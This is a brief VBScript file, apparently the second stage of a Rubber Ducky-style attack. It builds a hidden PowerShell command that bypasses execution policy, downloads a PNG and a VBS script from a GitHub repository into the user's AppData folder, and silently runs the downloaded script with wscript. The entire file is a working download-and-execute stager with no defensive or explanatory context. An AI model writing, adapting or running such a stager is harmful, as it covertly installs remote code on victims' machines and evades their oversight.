Set WshShell = CreateObject("WScript.Shell")

' =====================================================
' SECOND STAGE
' =====================================================
psCommand = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/crineson.png' " & _
    "-OutFile ""$env:APPDATA\crineson.png""; " & _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/yay.vbs' " & _
    "-OutFile ""$env:APPDATA\yay.vbs""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -FilePath ""wscript.exe"" -ArgumentList ""$env:APPDATA\yay.vbs"" -Wait;"


cmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
      Chr(34) & psCommand & Chr(34)

WshShell.Run cmd, 0, True
